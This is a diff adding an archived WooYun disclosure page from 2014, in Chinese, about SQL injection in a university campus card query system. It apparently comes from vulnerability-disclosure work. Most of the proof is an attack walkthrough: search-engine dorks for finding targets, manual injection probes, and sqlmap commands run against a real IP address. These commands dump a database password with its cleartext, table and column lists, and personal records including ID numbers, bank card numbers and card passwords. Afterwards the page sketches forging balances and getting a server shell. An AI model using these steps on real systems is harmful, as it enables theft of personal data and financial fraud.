@@ -1,0 +1,392 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		某一卡通系统SQL注入导致的诸多安全问题  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		某一卡通系统SQL注入导致的诸多安全问题  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/Xcode">Xcode</a> 
+</li><li>提交时间：		2014-03-28 22:47</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-03-28：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-04-02：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-04-12：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-04-22：	细节向普通白帽子公开<br/>
+									2014-05-02：	细节向实习白帽子公开<br/>
+									2014-05-12：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">SQL注入，可以导致用户信息泄漏，可以随意增改信息，甚至服务器沦陷。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">受影响产品：郑州新开普电子技术有限公司一卡通自助查询管理系统 <br />
+<br />
+产品漏洞：注入漏洞<br />
+<br />
+影响范围：由于很多高校或者公司都采用了这个一卡通系统，所以个人认为影响很大。虽然很多高校的一卡通系统放置于内网，但是同样存在这种危险性，亦不能忽视。本次漏洞验证以外网的一卡通系统为例。<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">漏洞验证：<br />
+<br />
+<br />
+<br />
+在google上随便寻找了一个<br />
+<br />
+inurl: Index_ShowNews.aspx?NewsCode<br />
+<br />
+inurl: /selfsearch/Index_ShowNews.aspx?NewsCode<br />
+<br />
+<br />
+<br />
+手工测试了下：<br />
+<br />
+and 1=1<br />
+<br />
+and 1=2<br />
+<br />
+and (select count (*) from dual)&gt;0—<br />
+<br />
+存在注入点，且数据库为oracle<br />
+<br />
+<br />
+<br />
+932 order by 7<br />
+<br />
+-1 union all select all null,null,null,null,null,null,null from dual--<br />
+<br />
+支持union注入<br />
+<br />
+<br />
+<br />
+用sqlmap跑一下：<br />
+<br />
+sqlmap -u &quot;http://202.101.244.45/selfsearch/Index_ShowNews.aspx?NewsCode=932&quot; --random-agent --is-dba<br />
+<br />
+current user is DBA:    True<br />
+<br />
+<br />
+<br />
+sqlmap -u &quot;http://202.101.244.45/selfsearch/Index_ShowNews.aspx?NewsCode=932&quot; --random-agent –passwords<br />
+<br />
+database management system users password hashes:                              <br />
+<br />
+ [*] CCENSE [1]:<br />
+<br />
+    password hash: 0EFA906BA34A9B3E<br />
+<br />
+    clear-text password: CCENSE<br />
+<br />
+<br />
+<br />
+sqlmap -u &quot;http://202.101.244.45/selfsearch/Index_ShowNews.aspx?NewsCode=932&quot; --random-agent --current-db<br />
+<br />
+current schema (equivalent to database on Oracle):    &#039;CCENSE&#039;<br />
+<br />
+<br />
+<br />
+sqlmap -u &quot;http://202.101.244.45/selfsearch/Index_ShowNews.aspx?NewsCode=932&quot; --random-agent –D CCENSE –tables<br />
+<br />
+Database: CCENSE                                                               <br />
+<br />
++--------------------------------+<br />
+<br />
+| ALERT_EMP_PURVIEW              |<br />
+<br />
+| ALERT_LEVEL                    |<br />
+<br />
+======&gt;等等&lt;=======<br />
+<br />
+| ALERT_LOG                      |<br />
+<br />
+| ZC_XY                          |<br />
+<br />
+| ZHEJIANG_GET_MAX               |<br />
+<br />
++--------------------------------+<br />
+<br />
+<br />
+<br />
+sqlmap -u &quot;http://202.101.244.45/selfsearch/Index_ShowNews.aspx?NewsCode=932&quot; --random-agent  -D CCENSE -T BASE_CUSTOMERS –columns<br />
+<br />
+Database: CCENSE                                                                      <br />
+<br />
+Table: BASE_CUSTOMERS<br />
+<br />
+[50 columns]<br />
+<br />
++-------------------+----------+<br />
+<br />
+| Column            | Type     |<br />
+<br />
++-------------------+----------+<br />
+<br />
+| BANKCARDNO        | VARCHAR2 |<br />
+<br />
+| CARDFUNC          | NUMBER   |<br />
+<br />
+| CARDNO            | NUMBER   |<br />
+<br />
+| CARDSFID          | NUMBER   |<br />
+<br />
+| CARDSN            | NUMBER   |<br />
+<br />
+| CARDTYPE          | NUMBER   |<br />
+<br />
+| CERTIFICATEID     | NUMBER   |<br />
+<br />
+| COUNTRY           | VARCHAR2 |<br />
+<br />
+| CURUSEDATE        | DATE     |<br />
+<br />
+| CUSTDEPT          | VARCHAR2 |<br />
+<br />
+| CUSTOMERID        | NUMBER   |<br />
+<br />
+| EMPCODE           | VARCHAR2 |<br />
+<br />
+| IDCARDNO          | VARCHAR2 |<br />
+<br />
+| IFPUSHFARE        | VARCHAR2 |<br />
+<br />
+| ISBIGFARECARD     | NUMBER   |<br />
+<br />
+| JPDM              | VARCHAR2 |<br />
+<br />
+| MEDICALTYPE       | NUMBER   |<br />
+<br />
+| NAME              | VARCHAR2 |<br />
+<br />
+| NATION            | VARCHAR2 |<br />
+<br />
+| NOUSEDATE         | DATE     |<br />
+<br />
+| ODDFARE           | NUMBER   |<br />
+<br />
+| ODDFAREACC        | NUMBER   |<br />
+<br />
+| OPCOUNT           | NUMBER   |<br />
+<br />
+| OPENDT            | DATE     |<br />
+<br />
+| OUTID             | VARCHAR2 |<br />
+<br />
+| PWD               | VARCHAR2 |<br />
+<br />
+| QUERYPWD          | VARCHAR2 |<br />
+<br />
+| REGSTARTYEAR      | NUMBER   |<br />
+<br />
+| SCANCODE          | VARCHAR2 |<br />
+<br />
+| SCARDSNR          | VARCHAR2 |<br />
+<br />
+| SERVERID          | NUMBER   |<br />
+<br />
+| SEX               | NUMBER   |<br />
+<br />
+| STATUS            | NUMBER   |<br />
+<br />
+| SUBODDFARE        | NUMBER   |<br />
+<br />
+| SUBODDFAREACC     | NUMBER   |<br />
+<br />
+| SUMADDFARE        | NUMBER   |<br />
+<br />
+| SUMCONSUMEFARE    | NUMBER   |<br />
+<br />
+| SUMDAIFA          | NUMBER   |<br />
+<br />
+| SUMDISCOUNT       | NUMBER   |<br />
+<br />
+| SUMFARE           | NUMBER   |<br />
+<br />
+| SUMLOAD           | NUMBER   |<br />
+<br />
+| SUMMAINCONSUME    | NUMBER   |<br />
+<br />
+| SUMMNGFARE        | NUMBER   |<br />
+<br />
+| SUMQC             | NUMBER   |<br />
+<br />
+| SUMSAVE           | NUMBER   |<br />
+<br />
+| SUMSUBSIDY        | NUMBER   |<br />
+<br />
+| SUMSUBSIDYCONSUME | NUMBER   |<br />
+<br />
+| SUMSUBSIDYLOAD    | NUMBER   |<br />
+<br />
+| SUMSXF            | NUMBER   |<br />
+<br />
+| VER               | NUMBER   |<br />
+<br />
++-------------------+----------+<br />
+<br />
+<br />
+<br />
+sqlmap -u &quot;http://202.101.244.45/selfsearch/Index_ShowNews.aspx?NewsCode=932&quot; --random-agent  -D CCENSE -T BASE_CUSTOMERS -C &quot;OUTID,IDCARDNO,SEX,PWD,NAME,QUERYPWD,BANKCARDNO&quot; --dump --start 1 --stop 2<br />
+<br />
+</p><p class="detail"><a href="../images/282133328ff5ecfa4d1aa4aee349a8a2eeecd50a.png" target="_blank"><img src="../images/282133328ff5ecfa4d1aa4aee349a8a2eeecd50a.png" alt="eeeee.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+至此，SQL注入可以导致用户个人信息泄漏，其中包括但不仅限于学号，性别，照片，身份证号，绑定的银行卡号，一卡通密码等。<br />
+<br />
+但是这还仅仅是信息泄漏，因为此时数据库的权限是dba，我们做到以下这些事：<br />
+<br />
+1．通过查询id，可以获取某个人的所有信息，包括历史账单等。<br />
+<br />
+2．通过模拟分析一卡通的充值流程，随意向任意账户添加任意金额。<br />
+<br />
+3．通过高权限的oracle，直接通过java存储过程来执行命令，getshell等，直接拿下服务器权限。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">修正sql注入问题，做好系统防护，数据库权限要分配合理。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/Xcode" title="Xcode">Xcode</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-054870" title="某一卡通系统SQL注入导致的诸多安全问题">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：16 </p>
+													<p class="detail">确认时间：2014-04-02 20:41</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"> </p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="54870";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
